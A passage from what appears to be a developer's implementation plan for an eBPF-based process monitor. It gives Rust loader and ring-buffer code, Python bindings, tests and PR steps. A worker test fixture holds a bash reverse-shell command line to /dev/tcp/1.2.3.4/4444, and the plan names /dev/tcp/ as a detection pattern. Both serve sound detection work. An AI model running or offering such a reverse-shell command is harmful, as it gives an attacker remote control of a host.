    m.add_class::<ProcessExecStream>()?;
    Ok(())
}
```

`#[pyclass(unsendable)]` because aya's `Ebpf` is not `Send`-safe.

- [ ] **Step 4: Re-export the new class**

Update `/home/eli/Development/inspectord/inspectord/_native/__init__.py`:

```python
"""Namespace package for the Rust extension module."""

from inspectord._native._native import ProcessExecStream, hello

__all__ = ["ProcessExecStream", "hello"]
```

- [ ] **Step 5: Failing Python test (skip-on-permission)**

Write `/home/eli/Development/inspectord/tests/test_native_loader.py`:

```python
"""Smoke test: ProcessExecStream loads the eBPF program when run as root."""

from __future__ import annotations

import os

import pytest


@pytest.mark.skipif(os.geteuid() != 0, reason="needs CAP_BPF (run as root)")
def test_process_exec_stream_loads_and_closes() -> None:
    from inspectord._native import ProcessExecStream

    stream = ProcessExecStream()
    try:
        assert stream is not None
    finally:
        stream.close()
```

- [ ] **Step 6: Verify locally**

```bash
cd /home/eli/Development/inspectord
source .venv/bin/activate
pip install -e '.[dev]' --no-build-isolation
pytest tests/test_native_loader.py -v
```

Expected (as a normal user): the test is SKIPPED with reason `needs CAP_BPF (run as root)`.

As root:

```bash
sudo /home/eli/Development/inspectord/.venv/bin/python -c "
from inspectord._native import ProcessExecStream
with ProcessExecStream() as s:
    print('loaded:', s)
"
```

Expected: prints `loaded: <ProcessExecStream object>` and exits cleanly. While the script runs, `bpftool prog list` should show a tracepoint program named `process_exec`.

Cargo gates:

```bash
cargo fmt --check
cargo clippy --workspace --all-targets -- -D warnings
cargo test --workspace --all-targets
```

- [ ] **Step 7: Commit + PR**

```bash
git checkout main && git pull origin main
git checkout -b task-bpf-06-loader
git add crates/inspectord_ebpf_process/ \
        inspectord/_native/__init__.py \
        tests/test_native_loader.py
git commit -m "feat(native): aya-based loader + ProcessExecStream PyO3 class"
git push -u origin task-bpf-06-loader
gh pr create --base main --head task-bpf-06-loader \
  --title "feat(native): aya loader + ProcessExecStream class" \
  --body "Embeds the BPF object via include_bytes! and exposes ProcessExecStream as a Python context manager that loads + attaches the tracepoint. Ring-buffer reading lands in PR 8. Smoke test skipped when not root."
```

Wait for CI green; do NOT merge.

---

## Task 7: Structured ProcessExecRecord emitted via ring buffer (pid, uid, gid, comm)

**Files:**
- Create: `crates/inspectord_ebpf_process_bpf/src/records.rs`
- Modify: `crates/inspectord_ebpf_process_bpf/src/main.rs`

**Branch:** `task-bpf-07-bpf-record-fields`

The BPF program now writes a structured record to a ring buffer for every tracepoint hit. Userspace reads it in PR 8.

Record schema (host-byte-order):

```
struct ProcessExecRecord {
    u64 timestamp_ns;
    u32 pid;
    u32 ppid;            // zero until PR 9
    u32 uid;
    u32 gid;
    u8  comm[16];        // TASK_COMM_LEN
    u16 cmdline_len;     // zero until PR 9
    u8  _padding[2];
    u8  cmdline[256];
}
```

- [ ] **Step 1: Define the shared record type**

Write `/home/eli/Development/inspectord/crates/inspectord_ebpf_process_bpf/src/records.rs`:

```rust
//! On-the-wire process_exec record schema shared between the BPF program
//! and the userspace loader. C-compatible layout so we can transmute the
//! ring-buffer byte slice on the userspace side.

#![allow(dead_code)]

pub const COMM_LEN: usize = 16;
pub const CMDLINE_LEN: usize = 256;

#[repr(C)]
#[derive(Clone, Copy)]
pub struct ProcessExecRecord {
    pub timestamp_ns: u64,
    pub pid: u32,
    pub ppid: u32,
    pub uid: u32,
    pub gid: u32,
    pub comm: [u8; COMM_LEN],
    pub cmdline_len: u16,
    pub _padding: [u8; 2],
    pub cmdline: [u8; CMDLINE_LEN],
}

impl ProcessExecRecord {
    pub const fn zeroed() -> Self {
        Self {
            timestamp_ns: 0,
            pid: 0,
            ppid: 0,
            uid: 0,
            gid: 0,
            comm: [0; COMM_LEN],
            cmdline_len: 0,
            _padding: [0; 2],
            cmdline: [0; CMDLINE_LEN],
        }
    }
}
```

- [ ] **Step 2: Update the BPF program to emit records**

Replace `/home/eli/Development/inspectord/crates/inspectord_ebpf_process_bpf/src/main.rs` with:

```rust
//! inspectord process_collector tracepoint program.
//!
//! Writes a ProcessExecRecord to the EVENTS ring buffer for every hit.

#![no_std]
#![no_main]

mod records;

use aya_ebpf::{
    bindings::BPF_RB_FORCE_WAKEUP,
    helpers::{
        bpf_get_current_comm, bpf_get_current_pid_tgid, bpf_get_current_uid_gid,
        bpf_ktime_get_ns,
    },
    macros::{map, tracepoint},
    maps::RingBuf,
    programs::TracePointContext,
};

use records::{ProcessExecRecord, COMM_LEN};

/// 256 KiB — enough headroom for bursty fork-bombs without dropping.
#[map]
static EVENTS: RingBuf = RingBuf::with_byte_size(262_144, 0);

#[tracepoint]
pub fn process_exec(_ctx: TracePointContext) -> u32 {
    let _ = try_process_exec();
    0
}

fn try_process_exec() -> Result<(), i64> {
    let mut entry = EVENTS.reserve::<ProcessExecRecord>(0).ok_or(-1_i64)?;
    let record_ptr = entry.as_mut_ptr();

    unsafe {
        (*record_ptr) = ProcessExecRecord::zeroed();
        (*record_ptr).timestamp_ns = bpf_ktime_get_ns();
        let pid_tgid = bpf_get_current_pid_tgid();
        (*record_ptr).pid = (pid_tgid >> 32) as u32;
        let uid_gid = bpf_get_current_uid_gid();
        (*record_ptr).uid = uid_gid as u32;
        (*record_ptr).gid = (uid_gid >> 32) as u32;

        if let Ok(comm) = bpf_get_current_comm() {
            let dst = &mut (*record_ptr).comm;
            let n = core::cmp::min(comm.len(), COMM_LEN);
            for i in 0..n {
                dst[i] = comm[i];
            }
        }
    }

    entry.submit(BPF_RB_FORCE_WAKEUP as u64);
    Ok(())
}

#[cfg(not(test))]
#[panic_handler]
fn panic(_info: &core::panic::PanicInfo) -> ! {
    loop {}
}
```

`bpf_get_current_comm()` returns `[u8; 16]`. `bpf_get_current_pid_tgid()` packs `tgid` in the upper 32 bits.

- [ ] **Step 3: Build + verify the program still links**

```bash
cd /home/eli/Development/inspectord
cargo build --release --target bpfel-unknown-none -p inspectord_ebpf_process_bpf
```

Expected: compiles cleanly. `llvm-readelf --sections target/bpfel-unknown-none/release/inspectord_ebpf_process_bpf` shows a `.maps` section and a `BTF` section.

- [ ] **Step 4: Smoke-test the load with the new program**

```bash
pip install -e '.[dev]' --no-build-isolation
sudo /home/eli/Development/inspectord/.venv/bin/python -c "
import time
from inspectord._native import ProcessExecStream
with ProcessExecStream() as s:
    print('loaded; sleeping 2s while another shell generates execs')
    time.sleep(2)
"
```

While that sleeps, run `ls /tmp` in another terminal. The program now writes records but we can't yet read them — we just confirm the loader still works.

- [ ] **Step 5: Cargo gates + Python suite**

```bash
cargo fmt --check
cargo clippy --workspace --all-targets -- -D warnings
cargo test --workspace --all-targets
pytest tests/ -v
```

All must pass.

- [ ] **Step 6: Commit + PR**

```bash
git checkout main && git pull origin main
git checkout -b task-bpf-07-bpf-record-fields
git add crates/inspectord_ebpf_process_bpf/
git commit -m "feat(bpf): emit structured ProcessExecRecord via ring buffer"
git push -u origin task-bpf-07-bpf-record-fields
gh pr create --base main --head task-bpf-07-bpf-record-fields \
  --title "feat(bpf): structured ProcessExecRecord on every tracepoint hit" \
  --body "BPF program now reserves a ProcessExecRecord in a 256KiB ring buffer for every tracepoint hit, fills pid/uid/gid/comm/timestamp_ns, and submits. ppid + cmdline still zero (PR 9). Userspace reader lands in PR 8."
```

Wait for CI green; do NOT merge.

---

## Task 8: Ring buffer reader on the userspace side + Python iterator

**Files:**
- Create: `crates/inspectord_ebpf_process/src/records.rs`
- Modify: `crates/inspectord_ebpf_process/src/loader.rs`
- Modify: `crates/inspectord_ebpf_process/src/lib.rs`
- Modify: `crates/inspectord_ebpf_process/Cargo.toml` (add libc)
- Create: `tests/test_native_records.py`
- Modify: `pyproject.toml` (add `ebpf_load` marker)
- Modify: `.github/workflows/ci.yml` (exclude `ebpf_load` from pytest)

**Branch:** `task-bpf-08-userspace-ringbuf`

The userspace crate now reads from the ring buffer and exposes each record as a Python dict via `ProcessExecStream.poll(timeout_ms)`. `poll` returns a list of records that have arrived since the last call (empty list on timeout).

- [ ] **Step 1: Mirror the BPF record schema on the userspace side**

Write `/home/eli/Development/inspectord/crates/inspectord_ebpf_process/src/records.rs`:

```rust
//! Mirror of crates/inspectord_ebpf_process_bpf/src/records.rs.
//!
//! Userspace reads ring-buffer bytes through this struct via plain memcpy.
//! Layout MUST match the BPF crate's record exactly.

#![allow(dead_code)]

pub const COMM_LEN: usize = 16;
pub const CMDLINE_LEN: usize = 256;

#[repr(C)]
#[derive(Clone, Copy)]
pub struct ProcessExecRecord {
    pub timestamp_ns: u64,
    pub pid: u32,
    pub ppid: u32,
    pub uid: u32,
    pub gid: u32,
    pub comm: [u8; COMM_LEN],
    pub cmdline_len: u16,
    pub _padding: [u8; 2],
    pub cmdline: [u8; CMDLINE_LEN],
}

impl ProcessExecRecord {
    pub fn from_bytes(bytes: &[u8]) -> Self {
        assert!(bytes.len() >= std::mem::size_of::<Self>());
        let mut out = Self {
            timestamp_ns: 0,
            pid: 0,
            ppid: 0,
            uid: 0,
            gid: 0,
            comm: [0; COMM_LEN],
            cmdline_len: 0,
            _padding: [0; 2],
            cmdline: [0; CMDLINE_LEN],
        };
        unsafe {
            std::ptr::copy_nonoverlapping(
                bytes.as_ptr(),
                &mut out as *mut Self as *mut u8,
                std::mem::size_of::<Self>(),
            );
        }
        out
    }

    pub fn comm_str(&self) -> String {
        let n = self.comm.iter().position(|&b| b == 0).unwrap_or(COMM_LEN);
        String::from_utf8_lossy(&self.comm[..n]).into_owned()
    }

    pub fn cmdline_str(&self) -> String {
        let n = (self.cmdline_len as usize).min(CMDLINE_LEN);
        let bytes: Vec<u8> = self.cmdline[..n]
            .iter()
            .map(|&b| if b == 0 { b' ' } else { b })
            .collect();
        String::from_utf8_lossy(&bytes).trim().to_string()
    }
}
```

- [ ] **Step 2: Add libc to the userspace crate**

Append to `[dependencies]` in `/home/eli/Development/inspectord/crates/inspectord_ebpf_process/Cargo.toml`:

```toml
libc = "0.2"
```

- [ ] **Step 3: Update loader to read records**

Replace `/home/eli/Development/inspectord/crates/inspectord_ebpf_process/src/loader.rs` with:

```rust
//! Loads the embedded BPF object into the kernel, attaches the
//! tracepoint program, and reads records from the ring buffer.

use aya::{
    maps::{ring_buf::RingBuf, MapData},
    programs::TracePoint,
    Ebpf,
};
use std::os::fd::AsRawFd;
use std::time::Duration;

use crate::records::ProcessExecRecord;

const PROGRAM_BYTES: &[u8] = include_bytes!(concat!(
    env!("OUT_DIR"),
    "/inspectord_ebpf_process_bpf"
));

pub struct LoadedProgram {
    _bpf: Ebpf,
    ring: RingBuf<MapData>,
}

impl LoadedProgram {
    pub fn load_and_attach() -> Result<Self, LoadError> {
        let mut bpf = Ebpf::load(PROGRAM_BYTES).map_err(LoadError::Aya)?;
        let program: &mut TracePoint = bpf
            .program_mut("process_exec")
            .ok_or(LoadError::MissingProgram)?
            .try_into()
            .map_err(LoadError::ProgramKind)?;
        program.load().map_err(LoadError::Aya)?;
        program
            .attach("sched", "sched_process_exec")
            .map_err(LoadError::Aya)?;

        let ring = RingBuf::try_from(bpf.take_map("EVENTS").ok_or(LoadError::MissingMap)?)
            .map_err(|e| LoadError::MapKind(format!("{e:?}")))?;

        Ok(Self { _bpf: bpf, ring })
    }

    fn drain(&mut self) -> Vec<ProcessExecRecord> {
        let mut out = Vec::new();
        while let Some(item) = self.ring.next() {
            if item.len() >= std::mem::size_of::<ProcessExecRecord>() {
                out.push(ProcessExecRecord::from_bytes(&item));
            }
        }
        out
    }

    pub fn poll(&mut self, timeout: Duration) -> Vec<ProcessExecRecord> {
        use libc::{poll, pollfd, POLLIN};
        let mut fds = [pollfd {
            fd: self.ring.as_raw_fd(),
            events: POLLIN,
            revents: 0,
        }];
        let timeout_ms = timeout.as_millis().min(i32::MAX as u128) as i32;
        let rc = unsafe { poll(fds.as_mut_ptr(), 1, timeout_ms) };
        if rc <= 0 {
            return Vec::new();
        }
        self.drain()
    }
}

#[derive(thiserror::Error, Debug)]
pub enum LoadError {
    #[error("aya error: {0}")]
    Aya(#[from] aya::EbpfError),
    #[error("program kind mismatch: {0}")]
    ProgramKind(aya::programs::ProgramError),
    #[error("BPF program 'process_exec' not found in object")]
    MissingProgram,
    #[error("BPF map 'EVENTS' not found in object")]
    MissingMap,
    #[error("map kind mismatch: {0}")]
    MapKind(String),
}
```

- [ ] **Step 4: Expose `poll` to Python**

Replace `/home/eli/Development/inspectord/crates/inspectord_ebpf_process/src/lib.rs` with:

```rust
//! Userspace loader for the inspectord process_collector eBPF program.

mod loader;
mod records;

use loader::LoadedProgram;
use pyo3::exceptions::{PyOSError, PyRuntimeError};
use pyo3::prelude::*;
use pyo3::types::PyDict;
use std::time::Duration;

#[pyclass(unsendable)]
struct ProcessExecStream {
    program: Option<LoadedProgram>,
}

#[pymethods]
impl ProcessExecStream {
    #[new]
    fn new() -> PyResult<Self> {
        let program = LoadedProgram::load_and_attach()
            .map_err(|e| PyOSError::new_err(format!("eBPF load failed: {e}")))?;
        Ok(Self { program: Some(program) })
    }

    /// Block for up to `timeout_ms` ms, then return all currently-available
    /// records as a list of dicts. Empty list on timeout.
    fn poll<'py>(&mut self, py: Python<'py>, timeout_ms: u64) -> PyResult<Vec<Bound<'py, PyDict>>> {
        let program = self
            .program
            .as_mut()
            .ok_or_else(|| PyRuntimeError::new_err("stream is closed"))?;
        let records = program.poll(Duration::from_millis(timeout_ms));
        let mut out = Vec::with_capacity(records.len());
        for record in records {
            let dict = PyDict::new_bound(py);
            dict.set_item("timestamp_ns", record.timestamp_ns)?;
            dict.set_item("pid", record.pid)?;
            dict.set_item("ppid", record.ppid)?;
            dict.set_item("uid", record.uid)?;
            dict.set_item("gid", record.gid)?;
            dict.set_item("comm", record.comm_str())?;
            dict.set_item("cmdline", record.cmdline_str())?;
            out.push(dict);
        }
        Ok(out)
    }

    fn close(&mut self) {
        self.program.take();
    }

    fn __enter__<'py>(slf: PyRef<'py, Self>) -> PyRef<'py, Self> {
        slf
    }

    fn __exit__(
        &mut self,
        _exc_type: PyObject,
        _exc_value: PyObject,
        _traceback: PyObject,
    ) -> bool {
        self.close();
        false
    }
}

#[pyfunction]
fn hello() -> &'static str {
    "hello from inspectord_ebpf_process"
}

#[pymodule]
fn _native(m: &Bound<'_, PyModule>) -> PyResult<()> {
    m.add_function(wrap_pyfunction!(hello, m)?)?;
    m.add_class::<ProcessExecStream>()?;
    Ok(())
}
```

- [ ] **Step 5: Register the `ebpf_load` pytest marker**

In `/home/eli/Development/inspectord/pyproject.toml`, find `[tool.pytest.ini_options]`. If a `markers = [...]` list exists, append:

```toml
"ebpf_load: tests that load real eBPF programs (require CAP_BPF / root)",
```

If no `markers =` list exists, add it:

```toml
[tool.pytest.ini_options]
markers = [
    "ebpf_load: tests that load real eBPF programs (require CAP_BPF / root)",
]
```

(Preserve any other entries already present.)

- [ ] **Step 6: Failing test**

Write `/home/eli/Development/inspectord/tests/test_native_records.py`:

```python
"""Reads real ring-buffer records produced by the tracepoint.

Only runs as root and only when invoked explicitly:

  sudo pytest -m ebpf_load tests/test_native_records.py
"""

from __future__ import annotations

import os
import subprocess
import time

import pytest


@pytest.mark.ebpf_load
@pytest.mark.skipif(os.geteuid() != 0, reason="needs CAP_BPF")
def test_poll_captures_subprocess_exec() -> None:
    from inspectord._native import ProcessExecStream

    with ProcessExecStream() as stream:
        stream.poll(100)  # warm-up drain
        subprocess.run(["/usr/bin/true"], check=True)
        records: list[dict[str, object]] = []
        deadline = time.monotonic() + 2.0
        while time.monotonic() < deadline:
            records.extend(stream.poll(100))
            if any(r["comm"] == "true" for r in records):
                break
        assert any(r["comm"] == "true" for r in records), (
            f"did not observe /usr/bin/true; records={records!r}"
        )
```

- [ ] **Step 7: Run the test as root**

```bash
sudo /home/eli/Development/inspectord/.venv/bin/python -m pytest -m ebpf_load tests/test_native_records.py -v
```

Expected: 1 passed in ~1 s.

As a regular user (CI behavior):

```bash
pytest -m "not ebpf_load" tests/ -v
```

Expected: 275 passed (the ebpf_load test is excluded by marker filter).

- [ ] **Step 8: Update CI to exclude `ebpf_load`**

In `.github/workflows/ci.yml`, find the existing `Pytest` step and change its `run:` to:

```yaml
      - name: Pytest
        run: pytest -m "not ebpf_load" tests/
```

(Update by the step's existing name if it differs.)

- [ ] **Step 9: Cargo gates**

```bash
cargo fmt --check
cargo clippy --workspace --all-targets -- -D warnings
cargo test --workspace --all-targets
```

- [ ] **Step 10: Commit + PR**

```bash
git checkout main && git pull origin main
git checkout -b task-bpf-08-userspace-ringbuf
git add crates/inspectord_ebpf_process/ \
        tests/test_native_records.py pyproject.toml .github/workflows/ci.yml
git commit -m "feat(native): ring-buffer reader + ProcessExecStream.poll() + ebpf_load marker"
git push -u origin task-bpf-08-userspace-ringbuf
gh pr create --base main --head task-bpf-08-userspace-ringbuf \
  --title "feat(native): ring-buffer reader + poll() API" \
  --body "Userspace now reads ProcessExecRecord items from the BPF ring buffer and exposes them as dicts via ProcessExecStream.poll(timeout_ms). Adds an ebpf_load pytest marker for tests that load real BPF programs; CI excludes them. Manual verification: sudo pytest -m ebpf_load captures a /usr/bin/true exec from the kernel."
```

Wait for CI green; do NOT merge.

---

## Task 9: BPF reads up to 256 bytes of command line + ppid

**Files:**
- Modify: `crates/inspectord_ebpf_process_bpf/src/main.rs`
- Modify: `tests/test_native_records.py`

**Branch:** `task-bpf-09-cmdline-extraction`

The BPF program reads the actual command line so the rule engine can match patterns like `/dev/tcp/`. Uses `bpf_probe_read_kernel` + `bpf_probe_read_user_str_bytes` against `task_struct` / `mm_struct` fields.

- [ ] **Step 1: Update the BPF program to fill cmdline + ppid**

Replace `/home/eli/Development/inspectord/crates/inspectord_ebpf_process_bpf/src/main.rs` with:

```rust
//! inspectord process_collector tracepoint program.
//!
//! Writes a ProcessExecRecord (with cmdline + ppid) to the EVENTS ring buffer.

#![no_std]
#![no_main]

mod records;

use aya_ebpf::{
    bindings::BPF_RB_FORCE_WAKEUP,
    helpers::{
        bpf_get_current_comm, bpf_get_current_pid_tgid, bpf_get_current_task,
        bpf_get_current_uid_gid, bpf_ktime_get_ns, bpf_probe_read_kernel,
        bpf_probe_read_user_str_bytes,
    },
    macros::{map, tracepoint},
    maps::RingBuf,
    programs::TracePointContext,
};

use records::{ProcessExecRecord, CMDLINE_LEN, COMM_LEN};

#[map]
static EVENTS: RingBuf = RingBuf::with_byte_size(262_144, 0);

// Hard-coded task_struct offsets for Linux 6.x x86_64 (CachyOS).
// A follow-up Phase 2 slice will replace these with CO-RE BTF relocations.
const TASK_REAL_PARENT_OFFSET: usize = 2272;
const TASK_TGID_OFFSET: usize = 1352;
const TASK_MM_OFFSET: usize = 2384;
const MM_ARG_START_OFFSET: usize = 312;

#[tracepoint]
pub fn process_exec(_ctx: TracePointContext) -> u32 {
    let _ = try_process_exec();
    0
}

fn try_process_exec() -> Result<(), i64> {
    let mut entry = EVENTS.reserve::<ProcessExecRecord>(0).ok_or(-1_i64)?;
    let record_ptr = entry.as_mut_ptr();

    unsafe {
        (*record_ptr) = ProcessExecRecord::zeroed();
        (*record_ptr).timestamp_ns = bpf_ktime_get_ns();
        let pid_tgid = bpf_get_current_pid_tgid();
        (*record_ptr).pid = (pid_tgid >> 32) as u32;
        let uid_gid = bpf_get_current_uid_gid();
        (*record_ptr).uid = uid_gid as u32;
        (*record_ptr).gid = (uid_gid >> 32) as u32;

        if let Ok(comm) = bpf_get_current_comm() {
            let dst = &mut (*record_ptr).comm;
            let n = core::cmp::min(comm.len(), COMM_LEN);
            for i in 0..n {
                dst[i] = comm[i];
            }
        }

        let task = bpf_get_current_task() as *const u8;
        if !task.is_null() {
            let mut real_parent: *const u8 = core::ptr::null();
            if bpf_probe_read_kernel(
                &mut real_parent as *mut *const u8 as *mut u8,
                core::mem::size_of::<*const u8>() as u32,
                task.add(TASK_REAL_PARENT_OFFSET),
            )
            .is_ok()
                && !real_parent.is_null()
            {
                let mut ppid: u32 = 0;
                if bpf_probe_read_kernel(
                    &mut ppid as *mut u32 as *mut u8,
                    4,
                    real_parent.add(TASK_TGID_OFFSET),
                )
                .is_ok()
                {
                    (*record_ptr).ppid = ppid;
                }
            }

            let mut mm: *const u8 = core::ptr::null();
            if bpf_probe_read_kernel(
                &mut mm as *mut *const u8 as *mut u8,
                core::mem::size_of::<*const u8>() as u32,
                task.add(TASK_MM_OFFSET),
            )
            .is_ok()
                && !mm.is_null()
            {
                let mut arg_start: u64 = 0;
                if bpf_probe_read_kernel(
                    &mut arg_start as *mut u64 as *mut u8,
                    8,
                    mm.add(MM_ARG_START_OFFSET),
                )
                .is_ok()
                    && arg_start != 0
                {
                    let dst = &mut (*record_ptr).cmdline;
                    if let Ok(n) = bpf_probe_read_user_str_bytes(arg_start as *const u8, dst) {
                        (*record_ptr).cmdline_len = (n as u16).min(CMDLINE_LEN as u16);
                    }
                }
            }
        }
    }

    entry.submit(BPF_RB_FORCE_WAKEUP as u64);
    Ok(())
}

#[cfg(not(test))]
#[panic_handler]
fn panic(_info: &core::panic::PanicInfo) -> ! {
    loop {}
}
```

**Important note on offsets.** The hard-coded byte offsets target Linux 6.x on x86_64 (CachyOS). They are fragile across kernel versions. A subsequent Phase 2 slice will replace these with CO-RE BTF relocations. If the cmdline arrives empty on a different kernel, re-derive offsets with `bpftool btf dump file /sys/kernel/btf/vmlinux format c | grep -A300 'struct task_struct '`.

- [ ] **Step 2: Build + manual smoke-test**

```bash
cd /home/eli/Development/inspectord
cargo build --release --target bpfel-unknown-none -p inspectord_ebpf_process_bpf
pip install -e '.[dev]' --no-build-isolation
sudo /home/eli/Development/inspectord/.venv/bin/python -c "
import time, subprocess
from inspectord._native import ProcessExecStream

with ProcessExecStream() as s:
    s.poll(50)  # warm
    subprocess.run(['/usr/bin/ls', '-la', '/tmp'])
    time.sleep(0.2)
    for r in s.poll(200):
        if r['comm'] == 'ls':
            print('found:', r)
"
```

Expected output: a record with `'comm': 'ls'` and `'cmdline': '/usr/bin/ls -la /tmp'`.

If cmdline is empty, hard-coded offsets are wrong for your kernel — re-derive from `bpftool btf dump`.

- [ ] **Step 3: Strengthen the test**

Replace `/home/eli/Development/inspectord/tests/test_native_records.py` with:

```python
"""Reads real ring-buffer records produced by the tracepoint.

Only runs as root and only when invoked explicitly:

  sudo pytest -m ebpf_load tests/test_native_records.py
"""

from __future__ import annotations

import os
import subprocess
import time

import pytest


@pytest.mark.ebpf_load
@pytest.mark.skipif(os.geteuid() != 0, reason="needs CAP_BPF")
def test_poll_captures_subprocess_exec_with_cmdline() -> None:
    from inspectord._native import ProcessExecStream

    with ProcessExecStream() as stream:
        stream.poll(100)
        subprocess.run(["/usr/bin/true", "--marker-arg-xyz"], check=True)
        records: list[dict[str, object]] = []
        deadline = time.monotonic() + 2.0
        while time.monotonic() < deadline:
            records.extend(stream.poll(100))
            if any(
                r["comm"] == "true" and "marker-arg-xyz" in str(r["cmdline"])
                for r in records
            ):
                break
        assert any(
            r["comm"] == "true" and "marker-arg-xyz" in str(r["cmdline"])
            for r in records
        ), f"did not observe true --marker-arg-xyz; records={records!r}"
```

The `--marker-arg-xyz` makes the test impossible to false-positive on system-noise `true` invocations.

- [ ] **Step 4: Run test**

```bash
sudo /home/eli/Development/inspectord/.venv/bin/python -m pytest -m ebpf_load tests/test_native_records.py -v
```

Expected: 1 passed.

- [ ] **Step 5: Cargo gates + non-`ebpf_load` Python suite**

```bash
cargo fmt --check
cargo clippy --workspace --all-targets -- -D warnings
cargo test --workspace --all-targets
pytest -m "not ebpf_load" tests/ -v
```

- [ ] **Step 6: Commit + PR**

```bash
git checkout main && git pull origin main
git checkout -b task-bpf-09-cmdline-extraction
git add crates/inspectord_ebpf_process_bpf/src/main.rs tests/test_native_records.py
git commit -m "feat(bpf): read up to 256 bytes of command line + ppid from task_struct"
git push -u origin task-bpf-09-cmdline-extraction
gh pr create --base main --head task-bpf-09-cmdline-extraction \
  --title "feat(bpf): cmdline + ppid extraction via probe_read" \
  --body "BPF program now reads task_struct.real_parent->tgid for ppid and reads up to 256 bytes from mm->arg_start for the cmdline. Offsets are hard-coded for Linux 6.x x86_64; CO-RE BTF relocations are slated for a follow-up slice."
```

Wait for CI green; do NOT merge.

---

## Task 10: ProcessCollectorWorker — Python worker that translates records to Events

**Files:**
- Create: `inspectord/workers/process_collector/__init__.py`
- Create: `inspectord/workers/process_collector/__main__.py`
- Create: `tests/workers/__init__.py` (if missing)
- Create: `tests/workers/test_process_collector_worker.py`

**Branch:** `task-bpf-10-process-collector-worker`

The worker opens a `ProcessExecStream`, polls it in `step()`, and writes one normalized Event per record. The translation:

```
record["pid"]           -> event.process.pid
record["comm"]          -> event.process.name
record["cmdline"]       -> event.process.command_line
record["ppid"]          -> event.process.parent.pid
record["uid"]           -> event.actor.user.id
record["timestamp_ns"]  -> event.observed_at  (offset by monotonic<->wall-clock delta)
                        -> event.module = "process_collector"
                        -> event.action = "process_start"
```

The existing process_enricher fills in `process.executable` and `process.hash.sha256` by reading `/proc/<pid>/exe`. For unit tests we feed a fake stream — no BPF load needed.

- [ ] **Step 1: Make the workers/ test dir importable**

```bash
mkdir -p /home/eli/Development/inspectord/tests/workers
```

If `/home/eli/Development/inspectord/tests/workers/__init__.py` doesn't exist, create it (empty).

- [ ] **Step 2: Failing test**

Write `/home/eli/Development/inspectord/tests/workers/test_process_collector_worker.py`:

```python
"""Tests the ProcessCollectorWorker independently of the BPF runtime.

The worker is parameterized with a stream factory so tests can inject a fake
that yields a fixed sequence of records.
"""

from __future__ import annotations

import json
from io import BytesIO
from typing import Any


class FakeStream:
    """Stand-in for inspectord._native.ProcessExecStream."""

    def __init__(self, batches: list[list[dict[str, Any]]]) -> None:
        self._batches = batches
        self._closed = False

    def poll(self, timeout_ms: int) -> list[dict[str, Any]]:
        if not self._batches:
            return []
        return self._batches.pop(0)

    def close(self) -> None:
        self._closed = True


def _read_events(buf: BytesIO) -> list[dict[str, Any]]:
    buf.seek(0)
    return [json.loads(line) for line in buf.read().splitlines() if line]


def test_worker_emits_event_per_record() -> None:
    from inspectord.workers.process_collector.__main__ import ProcessCollectorWorker

    sink = BytesIO()
    stream = FakeStream(
        [
            [
                {
                    "timestamp_ns": 1_700_000_000_000_000_000,
                    "pid": 1234,
                    "ppid": 999,
                    "uid": 1000,
                    "gid": 1000,
                    "comm": "bash",
                    "cmdline": "bash -i >& /dev/tcp/1.2.3.4/4444 0>&1",
                }
            ]
        ]
    )
    worker = ProcessCollectorWorker(
        stream_factory=lambda: stream,
        sink=sink,
        host_name="test-host",
    )
    worker.start()
    worker.step(poll_timeout_ms=10)
    worker.stop()

    events = _read_events(sink)
    assert len(events) == 1, events
    ev = events[0]
    assert ev["module"] == "process_collector"
    assert ev["action"] == "process_start"
    assert ev["host"]["name"] == "test-host"
    assert ev["process"]["pid"] == 1234
    assert ev["process"]["name"] == "bash"
    assert ev["process"]["command_line"] == "bash -i >& /dev/tcp/1.2.3.4/4444 0>&1"
    assert ev["process"]["parent"]["pid"] == 999
    assert ev["actor"]["user"]["id"] == "1000"


def test_worker_empty_poll_is_a_noop() -> None:
    from inspectord.workers.process_collector.__main__ import ProcessCollectorWorker

    sink = BytesIO()
    stream = FakeStream([])
    worker = ProcessCollectorWorker(
        stream_factory=lambda: stream,
        sink=sink,
        host_name="test-host",
    )
    worker.start()
    worker.step(poll_timeout_ms=1)
    worker.stop()

    assert _read_events(sink) == []


def test_worker_closes_stream_on_stop() -> None:
    from inspectord.workers.process_collector.__main__ import ProcessCollectorWorker

    sink = BytesIO()
    stream = FakeStream([])
    worker = ProcessCollectorWorker(
        stream_factory=lambda: stream,
        sink=sink,
        host_name="test-host",
    )
    worker.start()
    worker.stop()
    assert stream._closed is True
```

- [ ] **Step 3: Run the failing test**

```bash
pytest tests/workers/test_process_collector_worker.py -v
```

Expected: 3 errors / ImportError ("No module named 'inspectord.workers.process_collector'").

- [ ] **Step 4: Implement the worker**

```bash
mkdir -p /home/eli/Development/inspectord/inspectord/workers/process_collector
```

Write `/home/eli/Development/inspectord/inspectord/workers/process_collector/__init__.py`:

```python
"""process_collector worker."""
```

Write `/home/eli/Development/inspectord/inspectord/workers/process_collector/__main__.py`:

```python
"""inspectord-process-collector worker entry point.

Loads the tracepoint program via the inspectord_ebpf_process Rust extension,
polls the ring buffer, and emits one normalized process_start Event per
record.
"""

from __future__ import annotations

import argparse
import json
import socket
import sys
import time
import uuid
from collections.abc import Callable
from datetime import UTC, datetime
from pathlib import Path
from typing import IO, Any, Protocol


class _StreamProtocol(Protocol):
    def poll(self, timeout_ms: int) -> list[dict[str, Any]]: ...
    def close(self) -> None: ...


_DEFAULT_HOSTNAME = socket.gethostname()


def _default_stream_factory() -> _StreamProtocol:
    from inspectord._native import ProcessExecStream

    return ProcessExecStream()


class ProcessCollectorWorker:
    """Polls a ProcessExecStream and writes one Event per record.

    The stream_factory + sink injection makes the worker unit-testable
    without loading real eBPF programs.
    """

    def __init__(
        self,
        *,
        stream_factory: Callable[[], _StreamProtocol] = _default_stream_factory,
        sink: IO[bytes],
        host_name: str = _DEFAULT_HOSTNAME,
    ) -> None:
        self._stream_factory = stream_factory
        self._sink = sink
        self._host_name = host_name
        self._stream: _StreamProtocol | None = None
        self._wall_offset_ns: int = 0

    def start(self) -> None:
        self._stream = self._stream_factory()
        wall_ns = int(datetime.now(tz=UTC).timestamp() * 1e9)
        mono_ns = time.monotonic_ns()
        self._wall_offset_ns = wall_ns - mono_ns

    def step(self, *, poll_timeout_ms: int = 200) -> None:
        if self._stream is None:
            raise RuntimeError("worker not started")
        for record in self._stream.poll(poll_timeout_ms):
            event = self._record_to_event(record)
            self._sink.write(json.dumps(event).encode() + b"\n")
            self._sink.flush()

    def stop(self) -> None:
        if self._stream is not None:
            self._stream.close()
            self._stream = None

